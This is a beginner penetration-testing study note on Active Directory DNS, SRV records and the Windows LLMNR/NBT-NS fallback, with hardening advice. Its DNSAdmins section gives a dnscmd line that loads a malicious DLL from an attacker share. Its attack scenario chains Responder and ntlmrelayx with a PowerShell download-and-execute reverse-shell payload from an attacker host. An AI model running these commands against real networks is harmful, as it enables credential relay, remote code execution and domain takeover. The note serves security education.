---
tags: [active-directory, basics, foundations, vapt]
difficulty: beginner
module: "66 - AD Foundations and Core Concepts"
topic: "66.03 Active Directory DNS and Name Resolution"
---

# Active Directory DNS and Name Resolution

In an Active Directory (AD) environment, Domain Name System (DNS) is not merely a utility for resolving human-readable names to IP addresses—it is the absolute backbone of the entire infrastructure. Without a fully functional and properly configured DNS, Active Directory simply cannot exist. 

From an offensive security perspective, understanding how Active Directory manages DNS and how Windows environments resolve names when DNS fails provides some of the most reliable and highly utilized attack vectors in a penetration tester's arsenal (such as LLMNR/NBT-NS Poisoning and DNSAdmins abuse).

## Why Active Directory Relies Heavily on DNS

Active Directory uses DNS as its primary locator service. When a client machine boots up, a user attempts to log in, or an application requests an AD-integrated service, the client must find a Domain Controller capable of authenticating the request. It does this by querying DNS for specific Service Location (SRV) records.

If DNS goes down, clients cannot locate Domain Controllers, Kerberos authentication fails, Group Policies cannot be downloaded, and cross-domain trust routing breaks.

### AD-Integrated DNS Zones
Microsoft heavily pushes for "AD-Integrated" DNS. Instead of storing DNS zone files in flat text files (like traditional BIND servers), an AD-Integrated DNS server stores its DNS records directly inside the Active Directory database (`NTDS.dit`).
- **Replication:** Because DNS records are stored in AD partitions, they replicate automatically alongside standard AD objects to all other Domain Controllers in the domain (or forest).
- **Security:** AD-Integrated DNS supports **Secure Dynamic Updates**. Only authenticated AD clients are permitted to update or register their DNS records, preventing malicious hosts from overwriting critical DNS entries.

## Crucial SRV Records for Active Directory

Service (SRV) records allow clients to locate servers providing specific protocols. The most critical AD records are located within specific subdomains, such as `_tcp.Default-First-Site-Name._sites.dc._msdcs.domain.local`.

- `_ldap._tcp.dc._msdcs.<domain>`: Allows a client to locate a Domain Controller operating as an LDAP server.
- `_kerberos._tcp.dc._msdcs.<domain>`: Allows clients to locate a Key Distribution Center (KDC) for Kerberos ticket requests.
- `_gc._tcp.<forest_root>`: Allows clients to locate a Global Catalog server for forest-wide searches and universal group lookups.
- `_kpassword._tcp.<domain>`: Locates the Kerberos password change service (typically routing to the PDC Emulator).

## ASCII Diagram: Name Resolution Protocol Fallback

When a Windows machine attempts to resolve a hostname (e.g., a user types `\\fileshare` into Explorer), it does not just query DNS and give up if it fails. It follows an ordered fallback sequence. Attackers heavily exploit this fallback mechanism.

```text
=============================================================================
                 WINDOWS NAME RESOLUTION FALLBACK SEQUENCE
=============================================================================

   [ CLIENT REQUEST: "Where is 'FILESHARE'?" ]
                |
                v
   +------------------------------------+
   | 1. Local HOSTS File                |  --> (Check C:\Windows\System32\drivers\etc\hosts)
   +------------------------------------+
                | (If not found)
                v
   +------------------------------------+
   | 2. DNS Cache (ipconfig /displaydns)|  --> (Check locally cached recent resolutions)
   +------------------------------------+
                | (If not found)
                v
   +------------------------------------+
   | 3. Unicast DNS Query               |  --> (Query Primary/Secondary AD DNS Server)
   +------------------------------------+
                | (If DNS says "NXDOMAIN" or times out)
                v
   =================================================
   ||     ATTACK SURFACE: MULTICAST PROTOCOLS     ||
   =================================================
                |
   +------------------------------------+
   | 4. LLMNR (UDP 5355)                |  --> (Multicasts to entire local subnet)
   |    "Does anyone know 'FILESHARE'?" |      [ATTACKER CAN SPOOF RESPONSE HERE]
   +------------------------------------+
                | (If no response)
                v
   +------------------------------------+
   | 5. NBT-NS (UDP 137)                |  --> (Broadcasts to entire local subnet)
   |    "Does anyone know 'FILESHARE'?" |      [ATTACKER CAN SPOOF RESPONSE HERE]
   +------------------------------------+
```

## Alternative Name Resolution Protocols (The Fallbacks)

When a primary DNS lookup fails, Windows relies on legacy broadcast and multicast protocols to attempt to resolve the name on the local network segment.

### LLMNR (Link-Local Multicast Name Resolution)
LLMNR acts as a decentralized DNS alternative for local networks without a central DNS server. If a Windows host cannot resolve a name via DNS, it sends a multicast packet across the local subnet on UDP port 5355 asking, "Who has this hostname?"

### NBT-NS (NetBIOS Name Service)
An even older legacy protocol used by Windows. Similar to LLMNR, if name resolution fails, the host broadcasts an NBT-NS query on UDP port 137 to the entire local subnet.

### mDNS (Multicast DNS)
Operates on UDP port 5353. Similar to LLMNR, it is primarily used by Apple devices (Bonjour) and Linux hosts (Avahi), but modern Windows 10/11 environments also support it.

## Exploiting Name Resolution

The fallback mechanisms (LLMNR, NBT-NS, mDNS) inherently trust the network. They provide no authentication to verify the identity of the responder. This creates a massive vulnerability easily exploitable via tools like **Responder** or **Inveigh**.

### The Poisoning Attack Flow:
1. **The Mistake:** A user makes a typo in a file share request, e.g., typing `\\Corp-FS1` instead of `\\Corp-FS`.
2. **DNS Failure:** The Windows client queries the AD DNS server for `Corp-FS1`. The DNS server responds with `NXDOMAIN` (Non-Existent Domain).
3. **The Broadcast:** The Windows client broadcasts an LLMNR request to the local subnet: "Who has Corp-FS1?"
4. **The Spoof:** The attacker, running Responder, listens for this broadcast and immediately replies, "I am Corp-FS1! Here is my IP address."
5. **The Capture/Relay:** Believing the attacker is the file server, the victim's machine attempts to automatically authenticate to the attacker's machine via SMB (NTLM authentication). The attacker can either capture the NetNTLMv2 hash (to crack offline) or relay the authentication directly to another machine (NTLM Relaying) to gain unauthorized access.

### DNSAdmins Abuse
Beyond network-level spoofing, the DNS infrastructure itself can be attacked via AD permissions. 
If an attacker compromises an account in the `DnsAdmins` group, they can load an arbitrary DLL into the `dns.exe` service running on the Domain Controller. Since `dns.exe` runs as `NT AUTHORITY\SYSTEM` on the Domain Controller, this results in complete domain takeover.

The attacker simply uses the `dnscmd` utility to configure the DNS server to load a malicious plugin DLL from a network share:
```powershell
dnscmd dc01.corp.local /config /serverlevelplugindll \\attacker-ip\share\malicious.dll
```
Once the DNS service restarts (which a DnsAdmin can often force or wait for), the DLL executes as SYSTEM.

## Hardening Name Resolution
- **Disable LLMNR and NBT-NS:** These protocols should be disabled via Group Policy across the entire enterprise, forcing clients to rely strictly on secure AD DNS.
- **SMB Signing:** Require SMB Signing on all hosts to prevent NLM Relaying, even if poisoning occurs.
- **Restrict DNSAdmins:** Ensure only highly trusted Tier 0 accounts are members of the `DnsAdmins` group.

## Real-World Attack Scenario

**The Context:** An attacker has physically plugged a rogue device (like a Raspberry Pi) into the corporate network or gained initial access to a standard user's workstation. They have no domain credentials, just network access.

**The Thought Process:** AD heavily relies on DNS. When DNS fails, Windows falls back to broadcast protocols like LLMNR and NBT-NS. Users frequently mistype network share names (e.g., `\\filesrvr` instead of `\\fileserver`). The attacker sets up a listener to intercept these broadcast requests, spoof the response, and capture the resulting NTLM authentication attempt. Instead of trying to crack the hash offline, they will relay it directly to a high-value target that does not have SMB signing enforced.

**The Execution:**
1. **Network Reconnaissance:** The attacker runs `CrackMapExec` (or `NetExec`) to scan the subnet for servers with SMB Signing disabled.
   `nxc smb 10.0.1.0/24 --gen-relay-list targets.txt`
   *They identify `APP-SRV01` (an administrative jump box) has SMB signing disabled.*
2. **Setting up the Relay:** The attacker configures `ntlmrelayx` to listen for incoming authentications and relay them to `APP-SRV01`. They configure the payload to execute a reverse shell.
   `ntlmrelayx.py -tf targets.txt -c "powershell -c IEX(New-Object Net.WebClient).DownloadString('http://attacker-ip/shell.ps1')"`
3. **Poisoning the Network:** The attacker starts `Responder` with HTTP and SMB servers disabled (since `ntlmrelayx` is handling those ports).
   `Responder -I eth0 -r -d -w`
4. **The Trigger:** A highly privileged Helpdesk Admin accidentally types `\\helpdesk-sharee` into their Run dialog. DNS fails. The admin's machine broadcasts an LLMNR request: "Who has helpdesk-sharee?".
5. **The Capture:** Responder instantly replies: "I am helpdesk-sharee! Send your credentials." The admin's machine automatically attempts to authenticate to the attacker's IP.
6. **The Relay:** `ntlmrelayx` intercepts the Helpdesk Admin's NetNTLMv2 challenge-response and forwards it to `APP-SRV01`.

**The Outcome:** Because `APP-SRV01` does not require SMB signing, it accepts the relayed authentication from the Helpdesk Admin. The reverse shell executes in the context of the relayed user. The attacker goes from zero credentials to remote code execution on a critical infrastructure server in minutes.

## Chaining Opportunities
- **LLMNR Poisoning -> NTLM Relay -> DCSync:** An attacker uses Responder to poison an LLMNR request from a Domain Admin. Instead of cracking the hash, they relay the NTLM authentication to the Domain Controller via LDAP, using it to grant their own low-privileged user `Replicating Directory Changes` rights, followed by immediately executing a DCSync attack.
- **DNS Record Hijacking:** If "Secure Dynamic Updates" are improperly configured, an attacker can overwrite the DNS A record for a trusted server, redirecting traffic (like WSUS update traffic) to their own malicious server.

## Related Notes
- [[01 - What is Active Directory Domains Trees and Forests]]
- [[02 - Understanding FSMO Roles and Domain Controllers]]
- [[04 - LDAP Structure and Querying Basics]]
- [[05 - Users Groups and Computers OUs vs Containers]]
